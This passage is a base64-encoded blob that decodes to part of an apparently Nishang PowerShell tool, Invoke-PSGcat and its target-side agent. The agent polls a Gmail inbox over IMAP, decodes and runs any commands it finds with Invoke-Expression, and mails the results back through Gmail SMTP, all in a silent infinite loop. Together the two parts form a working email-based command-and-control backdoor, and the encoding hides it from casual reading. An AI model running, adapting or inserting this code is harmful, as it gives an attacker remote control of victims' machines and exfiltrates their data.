lIG91dHB1dC4KICAgIGlmICgkR2V0T3V0cHV0KQogICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIlJlYWRpbmcgT3V0cHV0IGZyb20gR21haWwiCiAgICAgICAgUmVhZFJlc3BvbnNlICIiCiAgICB9CiAgICAjTm9uIGludGVyYWN0aXZlCiAgICBlbHNlaWYgKCROb25JbnRlcmFjdGl2ZSkKICAgIHsKICAgICAgICAjSWYgU2NyaXB0cGF0aCBpcyBwcm92aWRlZCwgcmVhZCB0aGUgc2NyaXB0LgogICAgICAgIGlmICgkU2NyaXB0UGF0aCkKICAgICAgICB7CiAgICAgICAgICAgICRQYXlsb2FkID0gW0lPLkZpbGVdOjpSZWFkQWxsVGV4dCgiJFNjcmlwdFBhdGgiKSAtcmVwbGFjZSAiYG4iCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlNlbmRpbmcgUGF5bG9hZCB0byAkVXNlcm5hbWVAZ21haWwuY29tICRQYXlsb2FkIgogICAgICAgICAgICBTZW5kQ29tbWFuZCAkUGF5bG9hZCAkVXNlcm5hbWUgJFBhc3N3b3JkCiAgICAgICAgfQogICAgICAgICNlbHNlIHVzZSB0aGUgY29tbWFuZAogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlNlbmRpbmcgUGF5bG9hZCB0byAkVXNlcm5hbWVAZ21haWwuY29tICAkUGF5bG9hZCIKICAgICAgICAgICAgU2VuZENvbW1hbmQgJFBheWxvYWQgJFVzZXJuYW1lICRQYXNzd29yZAogICAgICAgIH0KCiAgICB9CiAgICAjSW50ZXJhY3RpdmUgcHJvbXB0CiAgICBlbHNlCiAgICB7CiAgICAgICAgd2hpbGUoJFBheWxvYWQgLW5lICJleGl0IikKICAgICAgICB7CiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlVzZSBHZXRPdXRwdXQgdG8gZ2V0IG91dHB1dC4iCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiVXNlIFNjcmlwdCB0byBzcGVjaWZ5IGEgc2NyaXB0LiIKICAgICAgICAgICAgJFBheWxvYWQgPSBSZWFkLUhvc3QgLVByb21wdCAiUHNHY2F0IgogICAgICAgICAgICBpZiAoJFBheWxvYWQgLWVxICJHZXRPdXRwdXQiKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJSZWFkaW5nIE91dHB1dCBmcm9tIEdtYWlsIgogICAgICAgICAgICAgICAgUmVhZFJlc3BvbnNlICIiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQYXlsb2FkIC1lcSAiU2NyaXB0IikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHBhdGggPSBSZWFkLUhvc3QgLVByb21wdCAiUHJvdmlkZSBjb21wbGV0ZSBwYXRoIHRvIHRoZSBQb3dlclNoZWxsIHNjcmlwdC4iCiAgICAgICAgICAgICAgICAkUGF5bG9hZCA9IFtJTy5GaWxlXTo6UmVhZEFsbFRleHQoIiRwYXRoIikgLXJlcGxhY2UgImBuIgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2VuZGluZyBQYXlsb2FkIHRvICRVc2VybmFtZUBnbWFpbC5jb20gICRQYXlsb2FkIgogICAgICAgICAgICAgICAgU2VuZENvbW1hbmQgJFBheWxvYWQgJFVzZXJuYW1lICRQYXNzd29yZAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2VuZGluZyBQYXlsb2FkIHRvICRVc2VybmFtZUBnbWFpbC5jb20gICRQYXlsb2FkIgogICAgICAgICAgICAgICAgU2VuZENvbW1hbmQgJFBheWxvYWQgJFVzZXJuYW1lICRQYXNzd29yZAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgSW52b2tlLVBzR2NhdEFnZW50IG5lZWRzIHRvIGJlIHJ1biBvbiB0YXJnZXQgbWFjaGluZSAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZnVuY3Rpb24gSW52b2tlLVBzR2NhdEFnZW50CnsKPCMKLlNZTk9QU0lTCk5pc2hhbmcgc2NyaXB0IHdoaWNoIGNhbiBiZSB1c2VkIHRvIGV4ZWN1dGUgY29tbWFuZHMgYW5kIHNjcmlwdHMgZnJvbSBHbWFpbCB1cGxvYWRlZCBieSBJbnZva2UtUFNHY2F0LgoKLkRFU0NSSVBUSU9OClRoaXMgc2NyaXB0IGlzIGNhcGFibGUgb2YgZXhlY3V0aW5nIGNvbW1hbmRzIGFuZC9vciBzY3JpcHRzIGZyb20gR21haWwgYW5kIHNlbmQgdGhlIG91dHB1dCBiYWNrLiAKQSB2YWxpZCBHbWFpbCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgcmVxdWlyZWQuClRoaXMgc2NyaXB0IG11c3QgYmUgZXhlY3V0ZWQgb24gdGhlIHRhcmdldCBhbmQgY29tbWFuZHMgc2hvdWxkIGJlIHVwbG9hZGVkIGJ5IEludm9rZS1Qc0djYXQgb24gYXR0YWNrZXIncyBtYWNoaW5lLgoKSW4gdGhlIEdtYWlsIHNlY3VyaXR5IHNldHRpbmdzIG9mIHRoYXQgYWNjb3VudCAiQWNjZXNzIGZvciBsZXNzIHNlY3VyZSBhcHBzIiBtdXN0IGJlIHR1cm5lZCBvbi4gTWFrZSBzdXJlIHRoYXQgeW91IHVzZQphIHRocm93IGF3YXkgYWNjb3VudC4KClNjcmlwdCBleGVjdXRpb24gaXMgbm90IHZlcnkgcmVsaWFibGUgcmlnaHQgbm93IGFuZCB5b3UgbWF5IHNlZSB0aGUgYWdlbnQgc3RydWdnbGluZyB0byBwdWxsIGEgYmlnIGVuY29kZWQgc2NyaXB0LgoKLlBBUkFNRVRFUiBVc2VybmFtZQpVc2VybmFtZSBvZiB0aGUgR21haWwgYWNjb3VudCB5b3Ugd2FudCB0byB1c2UuIAoKLlBBUkFNRVRFUiBQYXNzd29yZApQYXNzd29yZCBvZiB0aGUgR21haWwgYWNjb3VudCB5b3Ugd2FudCB0byB1c2UuIAoKLlBBUkFNRVRFUiBBZ2VudElECkFnZW50SUQgaXMgY3VycmVudGx5IHVudXNlZCBhbmQgd291bGQgYmUgdXNlZCB3aXRoIG11bHRpcGxlIGFnZW50IHN1cHBvcnQgaW4gZnV0dXJlLiAKCi5QQVJBTUVURVIgRGVsYXkKRGVsYXkgaW4gc2Vjb25kcyBhZnRlciBhIHN1Y2Nlc3NmdWwgZXhlY3V0aW9uLiBEZWZhdWx0IGlzIDYwLgoKLkVYQU1QTEUKUFMgPiBJbnZva2UtUFNHY2F0QWdlbnQgLVVzZXJuYW1lIHBzZ2NhdGxpdGUgLXBhc3N3b3JkIHBzcGFzc3dvcmQgLURlbGF5IDEwClB1bGwgbGF0ZXN0IGNvbW1hbmQvc2NyaXB0IGZyb20gR21haWwgYW5kIGV4ZWN1dGUgd2l0aCBhIGRlbGF5IG9mIDEwIHNlY29uZHMuCgouTElOSwpodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDE1LzA0L3BpbGxhZ2UtdGhlLXZpbGxhZ2UtcG93ZXJzaGVsbC12ZXJzaW9uLmh0bWwKaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4KCiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSgKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlcm5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBhc3N3b3JkLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRBZ2VudElELAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREZWxheSA9IDYwCiAgICApCiAgICAKICAgIAogICAgJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJTaWxlbnRseUNvbnRpbnVlIgogICAgICAgICAgICAgICAgCiAgICB3aGlsZSAoJHRydWUpCiAgICB7CiAgICAgICAgdHJ5IAogICAgICAgIHsKCiAgICAgICAgICAgICNCYXNpYyBJTUFQIGludGVyYWN0aW9uIGZyb20gaHR0cDovL2xlYXJuaW5ncGNzLmJsb2dzcG90LmluLzIwMTIvMDEvcG93ZXJzaGVsbC12Mi1yZWFkLWdtYWlsLW1vcmUtcHJvb2Ytb2YuaHRtbAogICAgICAgICAgICAkdGNwQ2xpZW50ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudAoKICAgICAgICAgICAgIyBDb25uZWN0IHRvIGdtYWlsCiAgICAgICAgICAgICR0Y3BDbGllbnQuQ29ubmVjdCgiaW1hcC5nbWFpbC5jb20iLCA5OTMpCiAgICAgICAgICAgIGlmKCR0Y3BDbGllbnQuQ29ubmVjdGVkKSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgIyBDcmVhdGUgbmV3IFNTTCBTdHJlYW0gZm9yIHRjcENsaWVudAogICAgICAgICAgICAgICAgW1N5c3RlbS5OZXQuU2VjdXJpdHkuU3NsU3RyZWFtXSAkc3NsU3RyZWFtID0gJHRjcENsaWVudC5HZXRTdHJlYW0oKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIEF1dGhlbnRpY2F0aW5nIGFzIGNsaWVudAogICAgICAgICAgICAgICAgJHNzbFN0cmVhbS5BdXRoZW50aWNhdGVBc0NsaWVudCgiaW1hcC5nbWFpbC5jb20iKTsKICAgICAgICAgICAgICAgICRzY3JpcHQ6cmVzdWx0ID0gIiIKICAgICAgICAgICAgICAgICRzYiA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuU3RyaW5nQnVpbGRlcgogICAgICAgICAgICAgICAgJG1haWwgPSIiCiAgICAgICAgICAgICAgICAkcmVzcG9uc2VidWZmZXIgPSBbQXJyYXldOjpDcmVhdGVJbnN0YW5jZSgiYnl0ZSIsIDIwNDgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICNTZW5kIElNQVAgY29tbWFuZHMgYW5kIHJlYWQgcmVzcG9uc2UKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIFJlYWRSZXNwb25zZSAoJGNvbW1hbmQsICRSZXR1cm5SZXN1bHQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHNiID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyCiAgICAgICAgICAgICAgICAgICAgaWYgKCRjb21tYW5kIC1uZSAiIikKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRjb21tYW5kCiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkY29tbWFuZCkKICAgICAgICAgICAgICAgICAgICAgICAgJHNzbFN0cmVhbS5Xcml0ZSgkYnVmLCAwLCAkYnVmLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJHNzbFN0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgJGJ5dGVzID0gJHNzbFN0cmVhbS5SZWFkKCRyZXNwb25zZWJ1ZmZlciwgMCwgMjA0OCkKICAgICAgICAgICAgICAgICAgICAkc3RyID0gJHNiLkFwcGVuZChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJHJlc3BvbnNlYnVmZmVyKSkKICAgICAgICAgICAgICAgICAgICAkc2IuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICNTZWxlY3QgdGhlIG91dHB1dCBvZiBTRUFSQ0ggSU1BUCBjb21tYW5kCiAgICAgICAgICAgICAgICAgICAgJHRlbXAgPSAkc2IuVG9TdHJpbmcoKSB8IFNlbGVjdC1TdHJpbmcgIlwqIFNFQVJDSCIKICAgICAgICAgICAgICAgICAgICBpZiAoJHRlbXApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkZmV0Y2ggPSAkdGVtcC5Ub1N0cmluZygpIC1zcGxpdCAiXCQiLDIKICAgICAgICAgICAgICAgICAgICAgICAgJHRtcCA9ICRmZXRjaFswXSAtc3BsaXQgIlwqIFNFQVJDSCAiIC1zcGxpdCAiICIgLXJlcGxhY2UgImBuIgogICAgICAgICAgICAgICAgICAgICAgICBbaW50XSRtYWlsID0gJHRtcFstMV0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICNGRVRDSCB0aGUgYm9keSBvZiB0aGUgbGFzdCBlbWFpbCB3aGljaCBtYXRjaGVzIHRoZSBTRUFSQ0ggY3JpdGVyaWEKICAgICAgICAgICAgICAgICAgICAgICAgJGNtZCA9IFJlYWRSZXNwb25zZSgiJCBGRVRDSCAkbWFpbCBCT0RZW1RFWFRdYHJgbiIsICIxIikKICAgICAgICAgICAgICAgICAgICAgICAgJHRtcCA9ICRjbWRbMl0gLXNwbGl0ICJcKSIsMiAtcmVwbGFjZSAiYG4iIAogICAgICAgICAgICAgICAgICAgICAgICAkVGVtcENvbW1hbmQgPSAoJHRtcFswXSAtc3BsaXQgIiMjIiwyKVsxXSAtcmVwbGFjZSAiKD88PVw9KTNEIiAtcmVwbGFjZSAiYHIiCiAgICAgICAgICAgICAgICAgICAgICAgICRFbmNDb21tYW5kID0gJFRlbXBDb21tYW5kIC1yZXBsYWNlICcoPyE9ezEsMn0kKT0nLCcnIC1yZXBsYWNlICJgciIKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhlY3V0aW5nIEVuY29kZWQgQ29tbWFuZCAkRW5jQ29tbWFuZCIKICAgICAgICAgICAgICAgICAgICAgICAgI0RlY29kZQogICAgICAgICAgICAgICAgICAgICAgICAkZGVjID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkRW5jQ29tbWFuZCkKICAgICAgICAgICAgICAgICAgICAgICAgJG1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtCiAgICAgICAgICAgICAgICAgICAgICAgICRtcy5Xcml0ZSgkZGVjLCAwLCAkZGVjLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgJG1zLlNlZWsoMCwwKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICRjcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCRtcywgW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpEZWNvbXByZXNzKQogICAgICAgICAgICAgICAgICAgICAgICAkc3IgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIoJGNzKQogICAgICAgICAgICAgICAgICAgICAgICAkY21kID0gJHNyLnJlYWR0b2VuZCgpCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSBJbnZva2UtRXhwcmVzc2lvbiAkY21kIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCgogICAgICAgICAgICAgICAgICAgICAgICAjU2VuZCByZXN1bHRzIHRvIGdtYWlsCiAgICAgICAgICAgICAgICAgICAgICAgICNodHRwOi8vc3RhY2tvdmVyZmxvdy5jb20vcXVlc3Rpb25zLzEyNTIzMzUvc2VuZC1tYWlsLXZpYS1nbWFpbC13aXRoLXBvd2Vyc2hlbGwtdjJzLXNlbmQtbWFpbG1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgJHNtdHBzZXJ2ZXIgPSDDouKCrMWTc210cC5nbWFpbC5jb23DouKCrAogICAgICAgICAgICAgICAgICAgICAgICAkbXNnID0gbmV3LW9iamVjdCBOZXQuTWFpbC5NYWlsTWVzc2FnZQogICAgICAgICAgICAgICAgICAgICAgICAkc210cCA9IG5ldy1vYmplY3QgTmV0Lk1haWwuU210cENsaWVudCgkc210cFNlcnZlciApCiAgICAgICAgICAgICAgICAgICAgICAgICRzbXRwLkVuYWJsZVNzbCA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICRzbXRwLkNyZWRlbnRpYWxzID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lk5ldHdvcmtDcmVkZW50aWFsKMOi4oKsxZMkVXNlcm5hbWXDouKCrCwgw6LigqzFkyRQYXNzd29yZMOi4oKsKTsgCiAgICAgICAgICAgICAgICAgICAgICAgICRtc2cuRnJvbSA9IMOi4oKsxZMkVXNlcm5hbWVAZ21haWwuY29tw6LigqwKICAgICAgICAgICAgICAgICAgICAgICAgJG1zZy5Uby5BZGQow6LigqwkVXNlcm5hbWVAZ21haWwuY29tw6LigqwpCiAgICAgICAgICAgICAgICAgICAgICAgICRtc2cuU3ViamVjdCA9ICJPdXRwdXQgZnJvbSAkZW52OkNvbXB1dGVybmFtZSIKICAgICAgICAgICAgICAgICAgICAgICAgJG1zZy5Cb2R5ID0gJHJlc3VsdAogICAgICAgICAgICAgICAgICAgICAgICAkc210cC5TZW5kKCRtc2cpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICNJbnRlcmFjdCB3aXRoIEdtYWlsIHVzaW5nIElNQVAKICAgICAgICAgICAgICAgIFJlYWRSZXNwb25zZSAiIgogICAgICAgICAgICAgICAgUmVhZFJlc3BvbnNlICgiJCBMT0dJTiAiICsgIiRVc2VybmFtZUBnbWFpbC5jb20iICsgIiAiICsgIiRQYXNzd29yZCIgKyAiICBgcmBuIikgfCBPdXQtTnVsbAogICAgICAgICAgICAgICAgUmVhZFJlc3BvbnNlKCIkIFNFTEVDVCBJTkJPWGByYG4iKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICBSZWFkUmVzcG9uc2UoIiQgU0VBUkNIIFNVQkpFQ1QgYCJDb21tYW5kYCJgcmBuIikKICAgICAgICAgICAgICAgIFJlYWRSZXNwb25zZSgiJCBMT0dPVVRgcmBuIikgIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICREZWxheQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0gCgogICAgICAgICAgICBlbHNlIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1FcnJvciAiWW91IGFyZSBub3QgY29ubmVjdGVkIHRvIHRoZSBob3N0LiBRdWl0dGluZyIKICAgICAgICAgICAgfQoKICAgICAgICB9CiAgICAgICAgY2F0Y2ggCiAgICAgICAgewogICAgICAgICAgICAkXwogICAgICAgIH0KICAgIH0KfSAgICAgICAgICAg
